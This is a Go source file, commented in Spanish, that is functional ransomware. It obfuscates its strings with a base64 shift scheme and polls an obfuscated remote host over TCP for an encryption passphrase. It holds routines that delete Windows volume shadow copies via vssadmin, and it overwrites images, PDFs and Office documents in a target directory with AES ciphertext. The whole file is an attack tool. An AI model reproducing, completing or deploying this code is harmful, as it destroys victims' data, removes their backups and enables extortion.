package main

import (
	"bytes"
	"io/ioutil"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"fmt"
	"io/fs"
	"log"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"encoding/base64"
	"net"
	"time"
	"bufio"
	"io"
)

var validExts = map[string]bool{
	".jpg":  true,
	".jpeg": true,
	".png":  true,
	".gif":  true,
	".docx": true,
	".xlsx": true,
	".pptx": true,
	".pdf":  true,
}
var passphrase string

// Formato de archivo cifrado
const (
	magicHeader = "ENCv1" // identificador (5 bytes)
	nonceSize   = 12      // GCM standard nonce size
	keySize     = 32      // AES-256
)

// --------------------- Operación VSS (Shadow Copies) ---------------------

// listShadows ejecuta "vssadmin list shadows" y devuelve los IDs encontrados.
func listShadows() ([]string, error) {
	vssadmin := "eoO{ZXSubX5>"
	vssadmin = desofuscarTexto(vssadmin)
	list := "cHm{eB>>"
	list = desofuscarTexto(list)
	shadows := "d3ii[H:4dx>>"
	shadows = desofuscarTexto(shadows)

	cmd := exec.Command(vssadmin, list, shadows)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("vs list sh error: %w - output: %s", err, string(out))
	}

	text := string(out)
	lines := strings.Split(text, "\n")
	var ids []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "Sh Copy ID:") {
			parts := strings.SplitN(line, ":", 2)
			if len(parts) == 2 {
				id := strings.TrimSpace(parts[1])
				ids = append(ids, id)
			}
		}
	}

	// Fallback: buscar GUIDs en el output
	if len(ids) == 0 {
		re := regexp.MustCompile(`\{[0-9A-Fa-f\-]{36}\}`)
		matches := re.FindAllString(text, -1)
		for _, m := range matches {
			ids = append(ids, m)
		}
	}

	return ids, nil
}

// deleteShadowByID intenta eliminar una sombra por su ID.
func deleteShadowByID(id string) error {
	vssadmin := "eoO{ZXSubX5>"
	vssadmin = desofuscarTexto(vssadmin)
	list := "cHm{eB>>"
	list = desofuscarTexto(list)
	shadows := "d3ii[H:4dx>>"
	shadows = desofuscarTexto(shadows)
	delete := "[HWt[YSm"
	delete = desofuscarTexto(delete)
	quiet := "M4G2bXW1"
	quiet = desofuscarTexto(quiet)

	param := "/shadow=" + id
	cmd := exec.Command(vssadmin, delete, shadows, param, quiet)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("error borrando sh %s: %w - output: %s", id, err, string(out))
	}
	return nil
}

// DeleteCorruptShadows lista las sombras y las elimina una por una.
// No hay forma fiable de distinguir "corruptas" desde vssadmin; aquí intentamos eliminar todas y loguear errores.
func DeleteCorruptShadows() {
	vssadmin := "eoO{ZXSubX5>"
	vssadmin = desofuscarTexto(vssadmin)
	list := "cHm{eB>>"
	list = desofuscarTexto(list)
	shadows := "d3ii[H:4dx>>"
	shadows = desofuscarTexto(shadows)
	delete := "[HWt[YSm"
	delete = desofuscarTexto(delete)
	quiet := "M4G2bXW1"
	quiet = desofuscarTexto(quiet)
	all := "M3GtcB>>"
	all = desofuscarTexto(all)

	log.Println("Listando copias sh...")
	ids, err := listShadows()
	if err != nil {
		log.Printf("Error listando som: %v\n", err)
		log.Println("Intentando eliminar todas las som..")
		cmd := exec.Command(vssadmin, delete, shadows, all, quiet)
		out, e2 := cmd.CombinedOutput()
		if e2 != nil {
			log.Fatalf("No se pudo eliminar con al: %v - output: %s", e2, string(out))
		}
		log.Println("Se eliminaron todas las som (al) correctamente.")
		return
	}

	if len(ids) == 0 {
		log.Println("No se encontraron copias sh.")
		return
	}

	for _, id := range ids {
		log.Printf("Intentando borrar sh: %s ...\n", id)
		if err := deleteShadowByID(id); err != nil {
			log.Printf("⚠️ Error al borrar %s: %v\n", id, err)
		} else {
			log.Printf("✅ Borrado: %s\n", id)
		}
	}
}

func ListFiles(root string) ([]string, error) {
	var found []string
	err := filepath.WalkDir(root, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return nil
		}
		if d.IsDir() {
			return nil
		}
		ext := strings.ToLower(filepath.Ext(d.Name()))
		if validExts[ext] {
			found = append(found, path)
		}
		return nil
	})
	if err != nil {
		return nil, err
	}
	return found, nil
}

func pad(src []byte, blockSize int) []byte {
	padding := blockSize - len(src)%blockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(src, padtext...)
}

// unpad removes PKCS7 padding
func unpad(src []byte) ([]byte, error) {
	length := len(src)
	if length == 0 {
		return nil, fmt.Errorf("unpad error: empty input")
	}
	padding := int(src[length-1])
	if padding > length {
		return nil, fmt.Errorf("unpad error: invalid padding")
	}
	return src[:length-padding], nil
}

// deriveKey returns 32-byte AES-256 key from passphrase
func deriveKey(passphrase string) []byte {
	hash := sha256.Sum256([]byte(passphrase))
	return hash[:]
}

// EncryptFileAES encrypts a file using AES-CBC with a fixed IV derived from the key
func EncryptFileAES(path string, passphrase string, removeOriginal bool) error {
	data, err := ioutil.ReadFile(path)
	if err != nil {
		return err
	}

	key := deriveKey(passphrase)
	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	iv := key[:aes.BlockSize]
	mode := cipher.NewCBCEncrypter(block, iv)

	padded := pad(data, aes.BlockSize)

	ciphertext := make([]byte, len(padded))
	mode.CryptBlocks(ciphertext, padded)

	outPath := path
	if err := ioutil.WriteFile(outPath, ciphertext, 0600); err != nil {
		return err
	}

	return nil
}

// EncryptFilesInList cifra una lista de archivos con la passphrase indicada.
func EncryptFilesInList(files []string, passphrase string, removeOriginal bool) {
	for _, f := range files {
		log.Printf("🔒 Ci: %s\n", f)
		if err := EncryptFileAES(f, passphrase, removeOriginal); err != nil {
			log.Printf("❌ Error ci %s: %v\n", f, err)
		} else {
			log.Printf("✅ OK: %s -> %s.enc\n", f, f)
		}
	}
}

func desofuscarTexto(texto string) string {

	textomod := make([]byte, len(texto))
	for i := 0; i < len(texto); i++ {
		textomod[i] = texto[i] - 1
	}

	pay, err := base64.StdEncoding.DecodeString(string(textomod))
	if err != nil {
		log.Fatal("error:", err)
	}

	return string(pay)
}

func reverse(host string) {
	con, err := net.Dial("tcp", host)
	if err != nil {
		return
	}
	re := bufio.NewReader(con)
	for {
		cp, err := re.ReadString('\n')

		if err != nil && err != io.EOF {
			log.Printf("Error conexion: %v\n", err)
			con.Close()
			reverse(host)
			return
		}
		log.Printf("cp: %s\n", cp)
		passphrase = cp
		return
	}
}
func main() {

	host := "NUlzMkF3PD5yMkF2OEp5PUh6"
	host = desofuscarTexto(host)

	for true {
		time.Sleep(3 * time.Second)
		reverse(host)
		if passphrase != "" {
			fmt.Println("tenemos passphrase")
			break
		}
	}

	//cambiar valor para que sea disco entero o a partir de una carpeta
	Dir := "R{pwWYOmdoNwenKwfIW{[YJ>"
	Dir = desofuscarTexto(Dir)
	passphrase = desofuscarTexto(passphrase)
	var removeOriginal bool = true

	//DeleteCorruptShadows()

	log.Printf("Recorriendo: %s\n", Dir)
	files, err := ListFiles(Dir)
	if err != nil {
		log.Fatalf("Error recorriendo directorio: %v\n", err)
	}

	//if *doList {
	if len(files) == 0 {
		log.Println("0 archivos")
	} else {
		log.Println("Files found:")
		for _, f := range files {
			fmt.Println(f)
		}
	}

	if len(files) == 0 {
		log.Println("No hay archivos a ci.")
	} else {
		EncryptFilesInList(files, passphrase, removeOriginal)
	}

}
